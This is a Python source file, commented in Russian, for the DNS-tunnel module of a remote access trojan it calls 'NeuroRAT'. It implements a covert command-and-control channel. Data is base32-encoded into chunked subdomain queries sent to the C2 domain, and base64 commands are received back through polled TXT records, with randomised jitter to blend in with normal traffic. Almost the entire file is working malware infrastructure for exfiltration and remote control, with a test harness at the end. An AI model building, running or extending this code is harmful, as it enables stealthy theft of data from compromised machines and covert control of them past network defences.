#!/usr/bin/env python3
"""
DNS Tunnel Module - Модуль для скрытой передачи данных через DNS-запросы
Обеспечивает двусторонний канал связи с C2-сервером через DNS-запросы
"""

import os
import base64
import time
import random
import socket
# import struct # Больше не нужен для пакетов
# import binascii # Используется только в _generate_session_id
import threading
from typing import Dict, List, Any, Optional, Tuple, Union, Callable
# import logging # Уже импортировано через get_logger
import binascii

# Используем dnspython для работы с DNS
import dns.resolver
import dns.message
import dns.query
import dns.rdatatype
import dns.rdataclass

# Используем относительный импорт, т.к. запускаем как модуль
from ..common.utils import get_logger

# DNS-заголовки и константы - теперь используются из dnspython
# DNS_QUERY_TYPE_A = 1
# DNS_QUERY_TYPE_TXT = 16
# DNS_CLASS_IN = 1

class DNSTunnel:
    """
    Класс для реализации DNS-туннелирования
    Позволяет передавать данные, закодированные в DNS-запросах (и получать ответы)
    """
    
    def __init__(
        self,
        c2_domain: str = "neurorat.com",
        query_interval: float = 1.0,
        jitter: float = 0.3,
        max_chunk_size: int = 30,
        callback: Optional[Callable[[bytes], None]] = None,
        dns_server_ip: Optional[str] = None,
        dns_server_port: Optional[int] = None
    ):
        """
        Инициализация DNS-туннеля
        
        Args:
            c2_domain: Домен C2-сервера
            query_interval: Интервал между запросами (секунды)
            jitter: Случайное отклонение для интервала (доля от интервала)
            max_chunk_size: Максимальный размер чанка для передачи
            callback: Колбэк для обработки полученных данных
            dns_server_ip: IP конкретного DNS-сервера (если нужно использовать его)
            dns_server_port: Порт конкретного DNS-сервера (если нужно использовать его)
        """
        self.c2_domain = c2_domain
        self.query_interval = query_interval
        self.jitter = jitter
        self.max_chunk_size = max_chunk_size
        self.callback = callback
        # Сохраняем переданные IP и порт DNS-сервера
        self.dns_server_ip = dns_server_ip
        self.dns_server_port = dns_server_port
        
        self.is_running = False
        self.receive_thread = None
        self.session_id = self._generate_session_id()
        self.sequence = 0
        
        # Настройка логирования
        self.logger = get_logger("dns_tunnel")

        # Получаем системные DNS-серверы при инициализации
        self._update_dns_servers()
    
    def _update_dns_servers(self) -> None:
        """Обновляет список системных DNS-серверов"""
        try:
            # Используем resolver из dnspython для получения системных серверов
            self.dns_servers = dns.resolver.get_default_resolver().nameservers
            if not self.dns_servers:
                self.logger.warning("Не удалось определить системные DNS-серверы, используем Google DNS.")
                self.dns_servers = ['8.8.8.8', '8.8.4.4']
            else:
                 self.logger.info(f"Используемые DNS-серверы: {self.dns_servers}")
        except Exception as e:
            self.logger.error(f"Ошибка при получении системных DNS-серверов: {e}. Используем Google DNS.")
            self.dns_servers = ['8.8.8.8', '8.8.4.4']

    def _generate_session_id(self) -> str:
        """Генерирует уникальный идентификатор сессии"""
        return binascii.hexlify(os.urandom(4)).decode()
    
    def start(self) -> bool:
        """Запускает DNS-туннель"""
        if self.is_running:
            return False
            
        self.is_running = True
        self.receive_thread = threading.Thread(
            target=self._receive_loop,
            daemon=True,
            name="DNS-Tunnel-Receiver"
        )
        self.receive_thread.start()
        
        self.logger.info(f"DNS-туннель запущен с сессией {self.session_id}")
        return True
    
    def stop(self) -> None:
        """Останавливает DNS-туннель"""
        self.is_running = False
        if self.receive_thread and self.receive_thread.is_alive():
            self.receive_thread.join(timeout=3)
        
        self.logger.info("DNS-туннель остановлен")
    
    def send(self, data: bytes) -> bool:
        """
        Отправляет данные через DNS-туннель
        
        Args:
            data: Бинарные данные для отправки
            
        Returns:
            bool: Успешность операции
        """
        # Кодируем данные в base32 (DNS-friendly), оставляем паддинг и верхний регистр
        encoded_data = base64.b32encode(data).decode('ascii') # Используем ascii декодирование
        
        # Разбиваем на чанки
        chunks = [encoded_data[i:i+self.max_chunk_size] for i in range(0, len(encoded_data), self.max_chunk_size)]
        
        success = True
        for i, chunk in enumerate(chunks):
            # Формируем поддомен с данными: [seq].[chunk].[session_id].[c2_domain]
            seq = f"{i:02x}" # Оставим последовательность для отладки на C2
            subdomain = f"{seq}.{chunk}.{self.session_id}.{self.c2_domain}"
            
            # Отправляем DNS-запрос (тип A, т.к. ответ нас не интересует)
            try:
                # Ответ не обрабатываем, просто отправляем запрос
                _ = self._send_dns_query(subdomain, query_type=dns.rdatatype.A)
                # Добавляем случайную задержку для имитации реального трафика
                jitter_value = self.query_interval * self.jitter * random.uniform(-1, 1)
                # Убедимся, что задержка не отрицательная
                sleep_time = max(0, self.query_interval + jitter_value)
                time.sleep(sleep_time)
            except Exception as e:
                self.logger.error(f"Ошибка при отправке DNS-запроса для данных: {e}")
                success = False
                # Можно добавить логику повторной отправки или выхода
        
        # self.sequence += 1 # Последовательность для чанков, а не для сессии
        
        # Отправляем сигнал о завершении передачи, если все чанки ушли успешно
        if success:
            done_success = self._send_done_signal(len(chunks))
            # Возвращаем успех, только если и данные, и сигнал ушли
            return done_success
        else:
            # Если отправка данных не удалась, не отправляем DONE
            return False
    
    def _send_done_signal(self, chunk_count: int) -> bool:
        """Отправляет сигнал о завершении передачи данных"""
        done_subdomain = f"done.{chunk_count}.{self.session_id}.{self.c2_domain}"
        try:
            # Отправляем DNS-запрос (тип A, т.к. ответ не важен, только доставка)
            _ = self._send_dns_query(done_subdomain, query_type=dns.rdatatype.A)
            self.logger.info(f"Отправлен сигнал DONE для сессии {self.session_id} ({chunk_count} чанков)")
            return True
        except Exception as e:
            self.logger.error(f"Ошибка при отправке сигнала DONE: {e}")
            return False
    
    def _send_dns_query(self, domain: str, query_type: dns.rdatatype.RdataType = dns.rdatatype.TXT) -> Optional[dns.message.Message]:
        """
        Отправляет DNS-запрос к указанному домену с использованием dnspython.
        Позволяет указать конкретный DNS-сервер и порт или использовать системные.

        Args:
            domain: Доменное имя для запроса
            query_type: Тип DNS-запроса (dnspython RdataType)

        Returns:
            Optional[dns.message.Message]: Распарсенный ответ на запрос или None
        """
        try:
            query_message = dns.message.make_query(domain, query_type)
            response = None

            # Если указан конкретный DNS-сервер и порт, используем их
            if hasattr(self, 'dns_server_ip') and self.dns_server_ip and hasattr(self, 'dns_server_port') and self.dns_server_port:
                server_ip = self.dns_server_ip
                server_port = self.dns_server_port
                self.logger.debug(f"Отправка DNS запроса на {domain} напрямую на {server_ip}:{server_port}")
                try:
                    response = dns.query.udp(query_message, server_ip, port=server_port, timeout=3.0)
                    if response:
                         rcode = response.rcode()
                         if rcode == dns.rcode.NOERROR:
                             self.logger.debug(f"Получен ответ от {server_ip}:{server_port} для {domain}")
                             return response
                         else:
                             self.logger.warning(f"Указанный DNS-сервер {server_ip}:{server_port} вернул ошибку {dns.rcode.to_text(rcode)} для {domain}")
                             # В случае ошибки от прямо указанного сервера, не пробуем другие
                             return response # Возвращаем ответ с ошибкой
                except dns.exception.Timeout:
                     self.logger.warning(f"Таймаут при запросе к указанному DNS-серверу {server_ip}:{server_port} для {domain}")
                     # Не пробуем другие, если сервер был указан явно
                     return None
                except Exception as e:
                     self.logger.error(f"Ошибка при запросе к указанному DNS-серверу {server_ip}:{server_port} для {domain}: {e}")
                     # Не пробуем другие
                     return None

            # Если конкретный сервер не указан, используем системные/дефолтные
            else:
                 self.logger.debug(f"Отправка DNS запроса на {domain} через системные DNS: {self.dns_servers}")
                 for server in self.dns_servers:
                     try:
                         # Используем UDP-запрос на стандартный порт 53
                         response = dns.query.udp(query_message, server, timeout=3.0)
                         if response:
                             # Проверяем RCODE (код ответа)
                             rcode = response.rcode()
                             if rcode == dns.rcode.NOERROR:
                                 # Успешный ответ от этого сервера
                                 self.logger.debug(f"Получен ответ от {server} для {domain}")
                                 return response
                             else:
                                 self.logger.warning(f"Системный DNS-сервер {server} вернул ошибку {dns.rcode.to_text(rcode)} для {domain}")
                                 # Пробуем следующий сервер
                     except dns.exception.Timeout:
                         self.logger.warning(f"Таймаут при запросе к системному DNS-серверу {server} для {domain}")
                         # Пробуем следующий сервер
                     except Exception as e:
                         self.logger.error(f"Ошибка при запросе к системному DNS-серверу {server} для {domain}: {e}")
                         # Пробуем следующий сервер

            # Если ни один системный сервер не ответил успешно или был ответ с ошибкой от последнего
            if response:
                 self.logger.warning(f"Ни один из системных DNS-серверов ({self.dns_servers}) не дал успешного NOERROR ответа для {domain}. Возвращаем последний ответ.")
                 return response # Возвращаем последний ответ (возможно, с ошибкой rcode)
            else:
                 # Сюда попадаем, если были только таймауты/ошибки связи со всеми системными серверами
                 self.logger.error(f"Не удалось связаться ни с одним из системных DNS-серверов ({self.dns_servers}) для {domain}")
                 return None

        except Exception as e:
            self.logger.error(f"Критическая ошибка при формировании/отправке DNS-запроса для {domain}: {e}")
            # В случае серьезной ошибки (например, с dnspython), обновляем список серверов на всякий случай
            self._update_dns_servers()
            return None
    
    def _receive_loop(self) -> None:
        """Цикл приема данных через DNS-туннель"""
        while self.is_running:
            try:
                # Отправляем запрос на получение данных (ожидаем TXT-запись)
                poll_domain = f"poll.{self.session_id}.{self.c2_domain}"
                response_message = self._send_dns_query(poll_domain, query_type=dns.rdatatype.TXT)

                data_received = b""
                if response_message and response_message.rcode() == dns.rcode.NOERROR:
                    # Ищем ответ в секции Answer
                    for answer in response_message.answer:
                        if answer.rdtype == dns.rdatatype.TXT:
                            # Извлекаем данные из TXT-записей
                            # TXT запись может быть разбита на несколько строк (<255 байт каждая)
                            for txt_string in answer.strings:
                                try:
                                    # Предполагаем, что данные закодированы в base64 C2-сервером
                                    # (Более устойчиво к разным символам, чем base32)
                                    # Убираем возможные кавычки, если сервер их добавляет
                                    decoded_part = base64.b64decode(txt_string.strip(b'\"\''))
                                    data_received += decoded_part
                                except binascii.Error as decode_error:
                                    self.logger.warning(f"Ошибка декодирования base64 из TXT ({txt_string}): {decode_error}")
                                except Exception as e:
                                    self.logger.error(f"Неожиданная ошибка при обработке TXT ({txt_string}): {e}")

                if data_received and self.callback:
                    try:
                        self.logger.info(f"Получено {len(data_received)} байт данных через DNS")
                        self.callback(data_received)
                    except Exception as cb_error:
                        self.logger.error(f"Ошибка при вызове callback: {cb_error}")

                # Добавляем случайную задержку для имитации реального трафика
                jitter_value = self.query_interval * self.jitter * random.uniform(-1, 1)
                sleep_time = max(0, self.query_interval + jitter_value)
                time.sleep(sleep_time)

            except dns.resolver.NoResolverConfiguration:
                 self.logger.error("Конфигурация DNS Resolver не найдена. Невозможно получить DNS-серверы.")
                 # Обновляем на Google DNS и спим дольше перед повторной попыткой
                 self.dns_servers = ['8.8.8.8', '8.8.4.4']
                 time.sleep(self.query_interval * 5)
            except Exception as e:
                self.logger.exception(f"Критическая ошибка в цикле приема DNS: {e}") # Используем exception для stack trace
                # В случае других серьезных ошибок, спим дольше перед повторной попыткой
                time.sleep(self.query_interval * 5)

# Тестирование модуля
if __name__ == "__main__":
    # Включим DEBUG для теста
    import logging # Импортируем здесь, т.к. вверху закомментировали
    logging.basicConfig(level=logging.DEBUG)

    # --- Конфигурация из переменных окружения ---
    # Домен C2, который настроен на DNS-сервер
    test_c2_domain = os.getenv("AGENT_C2_DOMAIN", "test.neurorat.local") 
    # IP или имя хоста DNS-сервера
    test_dns_server = os.getenv("AGENT_DNS_SERVER_IP", "dns-server") # Имя сервиса в Docker
    # Порт DNS-сервера
    test_dns_port_str = os.getenv("AGENT_DNS_SERVER_PORT", "5333")
    try:
        test_dns_port = int(test_dns_port_str)
    except ValueError:
        print(f"Ошибка: Неверный формат порта DNS-сервера: {test_dns_port_str}. Используем 5333.")
        test_dns_port = 5333

    print(f"--- Конфигурация Агента ---")
    print(f"C2 Domain: {test_c2_domain}")
    print(f"DNS Server: {test_dns_server}:{test_dns_port}")
    print(f"---------------------------")

    def data_callback(data: bytes) -> None:
        try:
            print(f"Получены данные: {data.decode('utf-8', errors='replace')}")
        except Exception as e:
            print(f"Ошибка декодирования callback данных: {e}, raw: {data}")

    # Создаем туннель, указывая параметры из переменных окружения
    tunnel = DNSTunnel(
        c2_domain=test_c2_domain,
        callback=data_callback,
        query_interval=5,
        dns_server_ip=test_dns_server,
        dns_server_port=test_dns_port
    )
    tunnel.start()

    try:
        # Отправляем тестовое сообщение
        print(f"Отправка тестового сообщения на {test_c2_domain}...")
        tunnel.send(b"PING from NeuroRAT DNS Tunnel Client!")
        print("Сообщение отправлено. Ожидание ответа от C2 (нужно настроить сервер)...")
        # Даем время на получение ответа (если C2 настроен отвечать на poll.* запросы)
        # C2 должен вернуть TXT запись на запрос poll.{session_id}.{test_c2_domain}
        # с base64-кодированными данными
        time.sleep(30)
    except KeyboardInterrupt:
        print("Прерывание пользователем.")
    finally:
        print("Остановка туннеля...")
        tunnel.stop()
        print("Туннель остановлен.") 